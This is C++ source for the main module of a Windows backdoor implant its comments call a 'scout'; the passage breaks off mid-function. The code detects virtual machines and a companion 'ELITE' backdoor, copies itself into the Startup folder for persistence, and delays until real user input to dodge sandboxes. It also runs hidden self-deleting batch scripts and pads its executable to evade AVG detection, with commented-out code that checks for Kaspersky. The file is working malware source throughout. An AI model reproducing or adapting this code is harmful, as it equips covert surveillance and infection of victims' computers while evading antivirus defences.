#include <Windows.h>
#include <stdio.h>
#include <Shlobj.h>
#include <Shlwapi.h>
#include <Sddl.h>
#include <Wbemidl.h>
#include <comdef.h> 
#include <Shobjidl.h>

#include "main.h"
#include "md5.h"
#include "api.h"
#include "binpatched_vars.h"
#include "autodelete_batch.h"
#include "agent_device.h"
#include "mybits.h"
#include "antivm.h"
#include "zmem.h"
#include "utils.h"

#define _GLOBAL_VERSION_FUNCTIONS_ //defines the exported function and the GetSharedMemoryName funcion
#include "version.h"

#pragma comment(lib, "advapi32")
#pragma comment(lib, "ws2_32")
#pragma comment(lib, "winhttp")
#pragma comment(lib, "netapi32")
#pragma comment(lib, "gdiplus")
#pragma comment(lib, "shell32")
#pragma comment(lib, "shlwapi")

extern VOID SyncThreadFunction();
extern PWCHAR GetRandomString(ULONG uMin);
//extern BYTE pServerKey[32];
//extern BYTE pConfKey[32];
//extern BYTE pSessionKey[20];
//extern BYTE pLogKey[32];
//extern BOOL bLastSync;

//BOOL uMelted = FALSE;
//PULONG uSynchro;

BOOL bLastSync = FALSE;
BOOL bSync = FALSE;
HANDLE hScoutSharedMemory;

/*
//#pragma comment(linker, "/EXPORT:MyConf=?MyConf@@YAXXZ")
//PWCHAR urs73A(PULONG pSynchro) // questa viene richiamata dai meltati
//__declspec(dllexport) PWCHAR jfk31d1QQ(PULONG pSynchro)
//__declspec(dllexport) PWCHAR reuio841001a(PULONG pSynchro) // questa viene richiamata dai meltati
//__declspec(dllexport) PWCHAR pqjjslanf(PULONG pSynchro) // questa viene richiamata dai meltati
//__declspec(dllexport) PWCHAR robertlee(PULONG pSynchro) // questa viene richiamata dai meltati
__declspec(dllexport) PWCHAR eflmakfil(PULONG pSynchro) // questa viene richiamata dai meltati
{
#ifdef _DEBUG
	OutputDebugString(L"[+] Setting uMelted to TRUE\n");
#endif
	
	PWCHAR pScoutName;
	
	uMelted = TRUE;
	uSynchro = pSynchro;

	pScoutName = (PWCHAR)VirtualAlloc(NULL, strlen(SCOUT_NAME)*sizeof(WCHAR) + 2*sizeof(WCHAR), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, SCOUT_NAME, strlen(SCOUT_NAME), pScoutName, strlen(SCOUT_NAME) + 2);

	return pScoutName;
}

PCHAR GetScoutSharedMemoryName()
{	
	CHAR strFormat[] = { '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '\0' };
	PCHAR pName = (PCHAR) malloc(16);
	memset(pName, 0x0, 16);

	_snprintf_s(pName, 
		16, 
		_TRUNCATE, 
		strFormat, 		
		pServerKey[5], pServerKey[6], pServerKey[5], pServerKey[4], pServerKey[3], pServerKey[2], pServerKey[1], pServerKey[0], pServerKey[2]);

	return pName;
}
*/

//#pragma section(".text", read,exec)
//__declspec(allocate(".text"))  DWORD ewiogh[1024] = {0xf1caf1ca, 0xf1caf1ca};

int CALLBACK WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow)
{
#ifdef _DEBUG_BINPATCH
	MessageBox(NULL, L"_DEBUG_BINPATCH", L"_DEBUG_BINPATCH", 0);
#endif
	
	if (GetCurrentThread() == 0x0)
	{
		//MessageBox(NULL, L"Error", L"wrong commandline arguments", 0);
		MessageBox(NULL, MSG_1, L"Error", 0);
		return 0;
	}

	memcpy(pServerKey, CLIENT_KEY, 32);
	memcpy(pConfKey, ENCRYPTION_KEY_CONF, 32);
	memcpy(pLogKey, ENCRYPTION_KEY, 32);
#ifdef _DEBUG_BINPATCH
	MD5((PBYTE)CLIENT_KEY, 32, (PBYTE)pServerKey);
	MD5((PBYTE)ENCRYPTION_KEY_CONF, 32, (PBYTE)pConfKey);
	MD5((PBYTE)ENCRYPTION_KEY, 32, (PBYTE)pLogKey);
#endif

	// first check for elite presence
	BOOL bVM = AntiVM();
	BOOL bElite = ExistsEliteSharedMemory();

	if (bVM || bElite)
	{
#ifdef _DEBUG
		OutputDebugString(L"[+] An ELITE backdoor is already installed here!\n");
#endif
		if (bElite && AmIFromStartup()) // FIXME: questo nn puo' essere.. 
			DeleteAndDie(FALSE);

		if (uMelted)
		{
			*uSynchro = 1;
			ExitThread(0);
		}
		else
			return 0;
	}
	// check if I'm already running
	if (ExistsScoutSharedMemory()) // FIXME - mi deleto perche' puo' essere il soldier, tanto se trova la shared mem vuol dire che c'e' un altro scout
	{
#ifdef _DEBUG
		OutputDebugString(L"[+] Scout already active\n");
#endif
		if (uMelted)
		{
			*uSynchro = 1;
			ExitThread(0);
		}
		else
			return 0;
	}

	MySleep(WAIT_DROP/2); // diamo tempo al soldier o elite, di eventualmente vincere la race se non siamo riusciti a cancellarci per qualche motivo

	if (!CreateScoutSharedMemory())
	{
#ifdef _DEBUG
		OutputDebugString(L"[+] Cannot create shared memory\n");
#endif
		if (uMelted)
		{
			*uSynchro = 1;
			ExitThread(0);
		}
		else
			return 0;
	}

	MySleep(WAIT_DROP/2);	

	//la CoInitializeEx restituisce un errore se utilizzata nella main e le successiva chiamata della CoInitialize,
	//nella GetDeviceInfo() e BitTransfer non andavanp a buon fine. Funzioni spostate all'interno della funzione SyncThreadFunction
	//HRESULT hRet = CoInitializeEx(0, COINIT_MULTITHREADED);
	//CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE,NULL);

	// do not drop if kaspersky x86
	//BOOL bIsWow64, bIsOS64, bDrop;
	//IsX64System(&bIsWow64, &bIsOS64);

	//bDrop = TRUE;
//	if (!bIsOS64)
//	{
//		WCHAR pKasp[] = { L's', L'p', L'e', L'r', L's', L'k', L'y', 0x0 };
//		PWCHAR pApplicationList = GetApplicationList(FALSE);

//		if (StrStrI(pApplicationList, pKasp))
//			bDrop = FALSE;

//		free(pApplicationList);
//	}

	if (!uMelted)
	{
		Drop();
		MySleep(1000);
		AvgInvisibility();
	}

	UseLess();
	WaitForInput();

	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SyncThreadFunction, NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);

	if (hScoutSharedMemory)
	{
		CloseHandle(hScoutSharedMemory);
		hScoutSharedMemory = NULL;
	}
	
	if (uMelted)
	{
		*uSynchro = 1;
		ExitThread(0);
	}

	return 0;
}

VOID Drop()
{
	if (!AmIFromStartup())
	{
#ifdef _DEBUG
	OutputDebugString(L"[+] Dropping..\n");
#endif

		WCHAR strExeFormat[] = { L'%', L'S', L'.', L'e', L'x', L'e', L'\0' };
		LPWSTR strDestPath = GetStartupScoutName();
		LPWSTR strSourcePath = GetMySelfName();
		LPWSTR strStartupPath = GetStartupPath();
		LPWSTR strDestFileName = (LPWSTR) malloc((strlen(SCOUT_NAME)+5)*sizeof(WCHAR));
		SecureZeroMemory(strDestFileName, (strlen(SCOUT_NAME)+5)*sizeof(WCHAR));
		_snwprintf_s(strDestFileName, strlen(SCOUT_NAME)+5, _TRUNCATE, strExeFormat, SCOUT_NAME);

		if (GetCurrentThread() == 0x0)
			MessageBox(NULL, MSG_2, L"Warning", 1);
			//MessageBox(NULL, L"Warning", L"Trying to recover..", 1);

		BOOL bFileExists = FALSE;
		BitTransfer(strSourcePath, strDestPath);
		for (DWORD i=0; i<2; i++)
		{
			if (PathFileExists(strDestPath))
			{
				bFileExists = TRUE;
				break;
			}
			Sleep(1000);
		}

		if (bFileExists)
		{
			free(strDestPath);
			free(strSourcePath);
			free(strStartupPath);
			free(strDestFileName);
			return;
		}

		if (!SUCCEEDED(ComCopyFile(strSourcePath, strStartupPath, strDestFileName)) || !PathFileExists(strDestPath))
			DoCopyFile(strSourcePath, strDestPath);

		free(strDestPath);
		free(strSourcePath);
		free(strStartupPath);
		free(strDestFileName);
	}
}

VOID DoCopyFile(PWCHAR pSource, PWCHAR pDest)
{
	PWCHAR pBatchName;
	
	CreateCopyBatch(pSource, pDest, &pBatchName);
	StartBatch(pBatchName);
	MySleep(8000);
	DeleteFile(pBatchName);
	
	free(pBatchName);
}

HRESULT CreateItemFromParsingName(__in LPWSTR strFileName, __out  IShellItem **psi)
{
	PIDLIST_ABSOLUTE pidl;
	HRESULT hr = SHParseDisplayName(strFileName, 0, &pidl, SFGAO_FOLDER, 0);
	if (SUCCEEDED(hr))
	{
		hr = SHCreateShellItem(NULL, NULL, pidl, psi);
		if (SUCCEEDED(hr))
			return S_OK;
	}

	return E_FAIL;
}

HRESULT ComCopyFile(__in LPWSTR strSourceFile, __in LPWSTR strDestDir, __in_opt LPWSTR strNewName)
{
	IFileOperation *pfo;
	HRESULT hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&pfo));

	if (SUCCEEDED(hr))
	{
		hr = pfo->SetOperationFlags(FOF_NO_UI);
		if (SUCCEEDED(hr))
		{
			IShellItem *psiFrom = NULL;
			//hr = SHCreateItemFromParsingName(strSourceFile, NULL, IID_PPV_ARGS(&psiFrom));
			hr = CreateItemFromParsingName(strSourceFile, &psiFrom);

			if (SUCCEEDED(hr))
			{
				IShellItem *psiTo = NULL;
				if (NULL != strDestDir)
					hr = CreateItemFromParsingName(strDestDir, &psiTo);
					//hr = SHCreateItemFromParsingName(strDestDir, NULL, IID_PPV_ARGS(&psiTo));

				if (SUCCEEDED(hr))
				{
					hr = pfo->CopyItem(psiFrom, psiTo, strNewName, NULL);

					if (NULL != psiTo)
						psiTo->Release();
				}                   
				psiFrom->Release();
			}

			if (SUCCEEDED(hr))
				hr = pfo->PerformOperations(); // copy file
		}
		pfo->Release();
	}

	return hr;
}

VOID UseLess()
{
	if (GetCurrentProcessId() == 4) 
	{
		//MessageBox(NULL, L"Error", L"Aborting now", 0);
		MessageBox(NULL, MSG_3, L"Error", 0);

		memset(DEMO_TAG, 0x0, 3);
		memset(WMARKER, 0x0, 3);
		memset(CLIENT_KEY, 0x0, 3);
		memset(ENCRYPTION_KEY_CONF, 0x0, 3);
		memset(SCOUT_NAME, 0x0, 3);
		memset(SCREENSHOT_FLAG, 0x0, 4);
	}
}


VOID WaitForInput()
{
	ULONG uLastInput;
	LASTINPUTINFO pLastInputInfo;
	
#ifdef _DEBUG
	OutputDebugString(L"[+] FIRST_WAIT\n");
#endif
	MySleep(WAIT_INPUT);

	pLastInputInfo.cbSize = sizeof(LASTINPUTINFO);
	GetLastInputInfo(&pLastInputInfo);
	uLastInput = pLastInputInfo.dwTime;

	while (1)
	{
		pLastInputInfo.cbSize = sizeof(LASTINPUTINFO);
		if (GetLastInputInfo(&pLastInputInfo))
		{
			if (pLastInputInfo.dwTime != uLastInput)
				break;
		}
		else
		{
#ifdef _DEBUG
			OutputDebugString(L"[+] GetLastInput FAILED\n");
#endif
			MySleep(3000);
			break;
		}

#ifdef _DEBUG
		OutputDebugString(L"[+] Waiting for input...\n");
#endif
		MySleep(3000);
	}	
}


VOID DeleteAndDie(BOOL bDie)
{
	HANDLE hFile;
	////char batch_format[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', ':', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '"', '%', 'S', '"', '\r', '\n', 'i', 'f', ' ', 'e', 'x', 'i', 's', 't', ' ', '"', '%', 'S', '"', ' ', 'g', 'o', 't', 'o', ' ', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', '%', 'S', '"', 0x0 };
	char batch_format[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', ':', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '"', '%', 'S', '"', '\r', '\n', 'i', 'f', ' ', 'e', 'x', 'i', 's', 't', ' ', '"', '%', 'S', '"', ' ', 'g', 'o', 't', 'o', ' ', 'd', '\r', '\n', 'e', 'c', 'h', 'o', ' ', ';', '>', '"', '%', 'S', '"', 0x0 };

	if (hScoutSharedMemory)
	{
		CloseHandle(hScoutSharedMemory);	
		hScoutSharedMemory = NULL;
	}

	if (uMelted) // from melted app
	{
		PWCHAR pFullPath = GetStartupScoutName();
		DeleteFile(pFullPath);
		free(pFullPath);

		if (bDie)
		{
			*uSynchro = 1;
			ExitThread(0);
		}
		return;
	}

	// not melted
	if (!AmIFromStartup())
	{ 
		PWCHAR pName = GetStartupScoutName();
		DeleteFile(pName);
		free(pName);

		if (bDie)
				ExitProcess(0);
		else
			return;
	}
	else // batch
	{
		PWCHAR pTempPath = GetTemp();
		PWCHAR pBatFileName = (PWCHAR)malloc(32767 * sizeof(WCHAR));

		ULONG uTick = GetTickCount();
		do
		{
			//_snwprintf_s(pBatFileName, 32766, _TRUNCATE, L"%s\\%d98355.bat", pTempPath, uTick++);
			//_snwprintf_s(pBatFileName, 32766, _TRUNCATE, L"%s\\%d437890.bat", pTempPath, uTick++);
			_snwprintf_s(pBatFileName, 32766, _TRUNCATE, L"%s\\%d%s", pTempPath, uTick++, BATCH_FILE_1);
			hFile = CreateFile(pBatFileName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hFile && hFile != INVALID_HANDLE_VALUE)
				break;
		}
		while(1);

#ifdef _DEBUG
		OutputDebugString(pBatFileName);
#endif

		// get full filename in startup
		PWCHAR pExeFileName = GetStartupScoutName();

		// create batch buffer
		ULONG uSize = strlen(batch_format) + 32676*3 + 1;
		LPSTR pBatchBuffer = (LPSTR)malloc(uSize);
		memset(pBatchBuffer, 0x0, uSize);
		_snprintf_s(pBatchBuffer, uSize, _TRUNCATE, batch_format, pExeFileName, pExeFileName, pBatFileName);

		// write it
		ULONG uOut;
		WriteFile(hFile, pBatchBuffer, strlen(pBatchBuffer), &uOut, NULL);
		CloseHandle(hFile);

		if (StartBatch(pBatFileName))
		{
			if (bDie)
			{
				if (uMelted)
				{
					*uSynchro = 1;
					ExitThread(0);
				}
				else
					ExitProcess(0);
			}
			else
				return;
		}
#ifdef _DEBUG
		else
			OutputDebugString(L"[!!] Error executing autodelete batch!!\n");
#endif
		free(pBatFileName);
		free(pExeFileName);
		free(pBatchBuffer);
		free(pTempPath);
	}
}


/*
PCHAR GetOldScoutSharedMemoryName()
{
	PCHAR pName = (PCHAR)malloc(16);
	memset(pName, 0x0, 16);

	_snprintf_s(pName, 
		16, 
		_TRUNCATE, 
		"%02X%02X%02X%02X%c%c", 
		pServerKey[3], pServerKey[2], pServerKey[1], pServerKey[0], 'B', 'R');

	return pName;
}
*/

PCHAR GetEliteSharedMemoryName()
{
	PCHAR pName = (PCHAR)malloc(16);
	memset(pName, 0x0, 16);
	memcpy(pName, WMARKER, 7);
	/*
	_snprintf_s(pName, 
		16, 
		_TRUNCATE, 
		//"%cX%X%02X%02X%02X%02X%02X", 
		"%.7s",
		&WMARKER[0], &WMARKER[1], &WMARKER[2], &WMARKER[3], &WMARKER[4], &WMARKER[5], &WMARKER[6]);
	*/
	return pName;
}

/*
PCHAR GetOldEliteSharedMemoryName()
{
	PCHAR pName = (PCHAR)malloc(16);
	memset(pName, 0x0, 16);

	_snprintf_s(pName, 
		16, 
		_TRUNCATE, 
		"%c%c%c%02X%02X%02X%02X", 
		'F', 'S', 'B', pServerKey[0], pServerKey[1], pServerKey[2], pServerKey[3]);

	return pName;
}
*/

BOOL CreateScoutSharedMemory()
{
	PCHAR pName;
	
#ifdef _DEBUG
	OutputDebugString(L"[+] Creating scout shared memory\n");
#endif
	if (ExistsScoutSharedMemory())
		return FALSE;

	pName = GetScoutSharedMemoryName();
	hScoutSharedMemory = CreateFileMappingA(INVALID_HANDLE_VALUE, 
		NULL,
		PAGE_READWRITE,
		0,
		SHARED_MEMORY_WRITE_SIZE,
		pName);
	free(pName);

	if (hScoutSharedMemory)
		return TRUE;
	
	return FALSE;
}

BOOL ExistsScoutSharedMemory()
{
	HANDLE hMem;
	PCHAR pName;
	BOOL uRet = FALSE;
	
	pName = GetScoutSharedMemoryName();
	hMem = OpenFileMappingA(FILE_MAP_READ, FALSE, pName);
	if (hMem)
	{
		uRet = TRUE;
		CloseHandle(hMem);
	}
	free(pName);
	
	return uRet;
}


BOOL ExistsEliteSharedMemory()
{
	HANDLE hMem;
	PCHAR pName;
	BOOL uRet = FALSE;
	
	pName = GetEliteSharedMemoryName();
	hMem = OpenFileMappingA(FILE_MAP_READ, FALSE, pName);
	if (hMem)
	{
		uRet = TRUE;
		CloseHandle(hMem);
	}
	free(pName);
	
	return uRet;
}


BOOL AmIFromStartup()
{
	BOOL uRet;
	
	PWCHAR pStartupPath = GetStartupPath();
	PWCHAR pCurrentPath = GetMySelfName();

	if (StrRChr(pCurrentPath, NULL, L'\\'))
		*(StrRChr(pCurrentPath, NULL, L'\\')) = 0;

	if (StrCmpI(pCurrentPath, pStartupPath))
		uRet = FALSE;
	else
		uRet = TRUE;
	
	free(pStartupPath);
	free(pCurrentPath);
	
	return uRet;
}

PWCHAR GetMySelfName()
{
	PWCHAR pName = (PWCHAR)malloc(32767*2 * sizeof(WCHAR));
	PWCHAR pShort = (PWCHAR)malloc(32767*2 * sizeof(WCHAR));
	
	GetModuleFileName(NULL, pName, 32766*2);
	if (!GetShortPathName(pName, pShort, 32767*2))
	{
		free(pShort);
		return pName;
	}
	free(pName);
	
	return pShort;
}

PWCHAR GetStartupPath()
{
	PWCHAR pStartupPath = (PWCHAR)malloc(32767*sizeof(WCHAR));
	PWCHAR pShortPath = (PWCHAR)malloc(32767*sizeof(WCHAR));
	
	SHGetSpecialFolderPath(NULL, pStartupPath, CSIDL_STARTUP, FALSE);
	GetShortPathName(pStartupPath, pShortPath, 4096);

	free(pStartupPath);
	
	return pShortPath;
}

PWCHAR GetStartupScoutName()
{
	WCHAR strFormat[] = { L'%', L's', L'\\', L'%', L'S', L'.', L'e', L'x', L'e', L'\0' };
	PWCHAR pStartupPath = GetStartupPath();
	PWCHAR pFullPath = (PWCHAR)malloc(32767*sizeof(WCHAR));
	
	_snwprintf_s(pFullPath, 32767, _TRUNCATE, strFormat, pStartupPath, SCOUT_NAME);
	free(pStartupPath);
	
	return pFullPath;
}




PWCHAR GetTemp()
{
	WCHAR strTemp[] = { L'T', L'M', L'P', L'\0' };
	PWCHAR pTemp = (PWCHAR)malloc(4096 * sizeof(WCHAR));
	PWCHAR pShort = (PWCHAR)malloc(4096 * sizeof(WCHAR));
	
	GetEnvironmentVariable(strTemp, pTemp, 32767); // FIXME GetTempPath
	GetShortPathName(pTemp, pShort, 4096);
	
	free(pTemp);
	return pShort;
}



VOID MySleep(ULONG uTime)
{
	//HANDLE hThread = GetCurrentThread();
	//WaitForSingleObject(hThread, uTime);
	Sleep(uTime);
}


BOOL StartBatch(PWCHAR pName)
{
	BOOL bRet;
		
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	PWCHAR pApplicationName = (PWCHAR)malloc(4096 * sizeof(WCHAR));
	WCHAR strOpts[] = { L'/', L'c', L' ', L'%', L's', L'\0' };
	WCHAR pTempInterpreter[] = { L'%', L'S', L'Y', L'S', L'T', L'E', L'M', L'R', L'O', L'O', L'T', L'%', L'\\', L's', L'y', L's', L't', L'e', L'm', L'3', L'2', L'\\', L'c', L'm', L'd', L'.', L'e', L'x', L'e', 0x0 };
	PWCHAR pInterpreter = (PWCHAR) malloc(32767 * sizeof(WCHAR));

	ExpandEnvironmentStrings(pTempInterpreter, pInterpreter, 32767 * sizeof(WCHAR));
	_snwprintf_s(pApplicationName, 4095, _TRUNCATE, strOpts, pName);

	SecureZeroMemory(&si, sizeof(STARTUPINFO));
	SecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	
	if (GetCurrentProcessId() == 4)
		MessageBox(NULL, MSG_4, L"Alert!", 0);
		//MessageBox(NULL, L"Not sure what's happening", L"ALERT!", 0);

	bRet = CreateProcess(pInterpreter, pApplicationName, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	free(pApplicationName);
	free(pInterpreter);
	
	return bRet;
}


VOID CreateDeleteBatch(PWCHAR pFileName, PWCHAR *pBatchOutName)
{
	HANDLE hFile;
	ULONG uTick, uOut;
	PWCHAR pTempPath = GetTemp();
	PWCHAR pBatchName = (PWCHAR) malloc(32767*sizeof(WCHAR));
	CHAR pBatchFormat[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', ':', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '"', '%', 'S', '"', '\r', '\n', 'i', 'f', ' ', 'e', 'x', 'i', 's', 't', ' ', '"', '%', 'S', '"', ' ', 'g', 'o', 't', 'o', ' ', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', '%', 'S', '"', 0x0 };
	PCHAR pBatchBuffer = (PCHAR) malloc(strlen(pBatchFormat) + (32767 * 3));
	
	uTick = GetTickCount();
	do
	{
		////_snwprintf_s(pBatchName, 32766, _TRUNCATE, L"%s\\%d02322.bat", pTempPath, uTick++);
		//_snwprintf_s(pBatchName, 32766, _TRUNCATE, L"%s\\%d124904.bat", pTempPath, uTick++);
		_snwprintf_s(pBatchName, 32766, _TRUNCATE, L"%s\\%d%s", pTempPath, uTick++, BATCH_FILE_2);
		hFile = CreateFile(pBatchName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile && hFile != INVALID_HANDLE_VALUE)
			break;
	}
	while (1);

	_snprintf_s(pBatchBuffer, strlen(pBatchFormat) + (32767 * 3), _TRUNCATE, pBatchFormat, pFileName, pFileName, pBatchName); 
	WriteFile(hFile, pBatchBuffer, strlen(pBatchBuffer), &uOut, NULL);
	CloseHandle(hFile);

	*pBatchOutName = pBatchName;

	free(pBatchBuffer);
	free(pTempPath);
}


VOID CreateReplaceBatch(PWCHAR pOldFile, PWCHAR pNewFile, PWCHAR *pBatchOutName)
{
	HANDLE hFile;
	ULONG uTick, uOut;
	PWCHAR pTempPath = GetTemp();
	PWCHAR pBatchName = (PWCHAR) malloc(32767*sizeof(WCHAR));
	CHAR pBatchFormat[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', ':', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '"', '%', 'S', '"', '\r', '\n', 'i', 'f', ' ', 'e', 'x', 'i', 's', 't', ' ', '"', '%', 'S', '"', ' ', 'g', 'o', 't', 'o', ' ', 'd', '\r', '\n', 't', 'y', 'p', 'e', ' ', '"', '%', 'S', '"', ' ', '>', ' ', '"', '%', 'S', '"', '\r', '\n', 's', 't', 'a', 'r', 't', ' ', '/', 'B', ' ', 'c', 'm', 'd', ' ', '/', 'c', ' ', '"', '%', 'S', '"', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', '%', 'S', '"', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', '%', 'S', '"', 0x0 };
	PCHAR pBatchBuffer = (PCHAR) malloc(strlen(pBatchFormat) + (32767 * 3));

	uTick = GetTickCount();
	do
	{
		//_snwprintf_s(pBatchName, 32766, _TRUNCATE, L"%s\\%d76833.bat", pTempPath, uTick++);
		_snwprintf_s(pBatchName, 32766, _TRUNCATE, L"%s\\%d%s", pTempPath, uTick++, BATCH_FILE_3);
		hFile = CreateFile(pBatchName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile && hFile != INVALID_HANDLE_VALUE)
			break;
	}
	while (1);

	_snprintf_s(pBatchBuffer, strlen(pBatchFormat) + (32767 * 3), _TRUNCATE, pBatchFormat, pOldFile, pOldFile, pNewFile, pOldFile, pOldFile, pNewFile, pBatchName); 
	WriteFile(hFile, pBatchBuffer, strlen(pBatchBuffer), &uOut, NULL);
	CloseHandle(hFile);

	*pBatchOutName = pBatchName;

	free(pBatchBuffer);
	free(pTempPath);
}


VOID CreateCopyBatch(PWCHAR pSource, PWCHAR pDest, PWCHAR *pBatchOutName)
{
	HANDLE hFile;
	ULONG uTick ,uOut;
	PWCHAR pTempPath = GetTemp();
	PWCHAR pBatchName = (PWCHAR)malloc(32767*sizeof(WCHAR));
	CHAR pBatchFormat[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', 't', 'y', 'p', 'e', ' ', '"', '%', 'S', '"', ' ', '>', '"', '%', 'S', '"', 0x0};
	PCHAR pBatchBuffer = (PCHAR)malloc(strlen(pBatchFormat) + (32767 * 3));

	uTick = GetTickCount();
	do
	{
		WCHAR pName[] = { L'%', L's', L'\\', L'%', L'd', L'.', L'b', L'a', L't', L'\0' };
		_snwprintf_s(pBatchName, 32766, _TRUNCATE, pName, pTempPath, uTick++);
		hFile = CreateFile(pBatchName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile && hFile != INVALID_HANDLE_VALUE)
			break;
	}
	while (1);

	_snprintf_s(pBatchBuffer, strlen(pBatchFormat) + (32767 * 3), _TRUNCATE, pBatchFormat, pSource, pDest);
	WriteFile(hFile, pBatchBuffer, strlen(pBatchBuffer), &uOut, NULL);
	CloseHandle(hFile);

	*pBatchOutName = pBatchName;

	free(pBatchBuffer);
	free(pTempPath);
}


LPWSTR CreateTempFile()
{
	WCHAR pTempPath[MAX_PATH + 1];
	LPWSTR pShortTempPath = (LPWSTR) malloc((MAX_PATH + 1)*sizeof(WCHAR));
	LPWSTR pTempFileName = (LPWSTR) malloc((MAX_PATH + 1)*sizeof(WCHAR));
	LPWSTR pShortTempFileName = (LPWSTR) malloc((MAX_PATH + 1)*sizeof(WCHAR));
	
	memset(pTempPath, 0x0, (MAX_PATH + 1)*sizeof(WCHAR));
	memset(pShortTempPath, 0x0, (MAX_PATH + 1)*sizeof(WCHAR));
	memset(pTempFileName, 0x0, (MAX_PATH + 1)*sizeof(WCHAR));
	memset(pShortTempFileName, 0x0, (MAX_PATH + 1)*sizeof(WCHAR));

	GetTempPath(MAX_PATH + 1, pTempPath);
	GetShortPathName(pTempPath, pShortTempPath, (MAX_PATH + 1)*sizeof(WCHAR));

	GetTempFileName(pTempPath, L"13", 0, pTempFileName);
	GetShortPathName(pTempFileName, pShortTempFileName, (MAX_PATH + 1)*sizeof(WCHAR));

	free(pShortTempPath);
	free(pTempFileName);
	
	return pShortTempFileName;
}

VOID AvgInvisibility()
{

	    /* 
		   Solves Avg General Behavior detection by increasing scout size in startup,
		   scout not run from startup is not affected by this detection:

			- a] current process is not running from startup -> append garbage to scout executable dropped in startup
			- b] current process is the scout running from startup -> drop a garbage file in %temp%, the a batch that 
																	  waits for current process to bail and then appends
																	  the garbage to scout executable in startup and spawns
																	  a 'fat' scout process
		*/
		    

		LPWSTR strDestPath = GetStartupScoutName();
		LPWSTR strSourcePath = GetMySelfName();
		LPWSTR strStartupPath = GetStartupPath();

		/* make avg scout fat */
		WCHAR szAvg[] = { L'A', L'V', L'G', 0x0 };
		PWCHAR pApplicationList = NULL;
		BOOL bIsWow64, bIsOS64;
		
		IsX64System(&bIsWow64, &bIsOS64);
		
		if (!bIsOS64)
			pApplicationList = GetApplicationList(FALSE);
		else
			pApplicationList = GetApplicationList(TRUE);
		
		

#ifdef _DEBUG
	if (!bIsOS64)
		OutputDebugString(L"32bit");
	else
		OutputDebugString(L"64bit");
#endif

		if (StrStrI(pApplicationList, szAvg)) 
		{
			HANDLE hScout = CreateFile(strDestPath, GENERIC_READ, FILE_SHARE_READ , NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if(hScout == INVALID_HANDLE_VALUE)
			{
#ifdef _DEBUG
				OutputDebugString(L"Failed opening scout");
				OutputDebugString(strDestPath);
				OutputDebugString(L"\n");
#endif
				
			} else
			{
#ifdef _DEBUG
				OutputDebugString(L"Read handle opened ");
				OutputDebugString(strDestPath);
				OutputDebugString(L"\n");
#endif

				/*LARGE_INTEGER lM;
				lM.QuadPart =  1048576 + 10;
				LONGLONG lPadding = 0;
				LARGE_INTEGER lFileSize;
				GetFileSizeEx(hScout, &lFileSize);
				lPadding = lM.QuadPart - lFileSize.QuadPart;*/

				DWORD dwM = 1048576 + 10;
				DWORD dwPadding= 0;
				DWORD dwFileSize = GetFileSize(hScout, NULL);

				dwPadding = dwM - dwFileSize;

				/* padding must an 8 byte multiple */
				while( dwPadding % 8 != 0 )
					dwPadding += 1;
				

				if( dwPadding > 0 )
				{

					/* a] not running from startup, just expand scout file on startup */
					if( !AmIFromStartup() )  
					{
						
						BOOL bFileAppended = FALSE;
						DWORD dwBytesWritten = 0;
							
						LPBYTE lpGarbagePadding = GetRandomData(dwPadding);
						LPBYTE lpFatExecutableBuffer = AppendDataInSignedExecutable(hScout, lpGarbagePadding, dwPadding, &dwFileSize);
						
						/* read only handle was needed by AppendDataInSignedExecutable, now open an w one */
						CloseHandle(hScout);
						

						hScout = CreateFile(strDestPath, CREATE_ALWAYS, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

						if( lpFatExecutableBuffer != NULL )
						{
	 						DWORD dwFilePtr = SetFilePointer(hScout, 0, NULL, FILE_BEGIN);
							if(dwFilePtr != INVALID_SET_FILE_POINTER)
							{
								bFileAppended = WriteFile(hScout, lpFatExecutableBuffer, dwFileSize, &dwBytesWritten, NULL);
